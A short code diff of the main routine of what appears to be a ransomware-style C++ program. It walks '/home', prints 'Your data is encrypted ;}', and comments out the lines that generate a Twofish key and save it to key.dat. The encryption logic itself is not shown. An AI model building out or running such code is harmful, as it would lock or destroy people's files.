@@ -7,16 +7,16 @@
 
 
 int main(int argc, char **argv) {
-    std::shared_ptr<sisyph::Symmetric> coolCryptor(std::make_shared<sisyph::Twofish>());
+    //std::shared_ptr<sisyph::Symmetric> coolCryptor(std::make_shared<sisyph::Twofish>());
 
     Walker shadowWalker("/home");
 
     shadowWalker.setCmdArgs(argc, argv);
 
-    std::ofstream saveKey("key.dat");
+    //std::ofstream saveKey("key.dat");
 
-    saveKey << coolCryptor->getKey();
-    saveKey.close();
+    //saveKey << coolCryptor->getKey();
+    //saveKey.close();
     shadowWalker.walk();
 
     std::cout << "Your data is encrypted ;}" << std::endl;
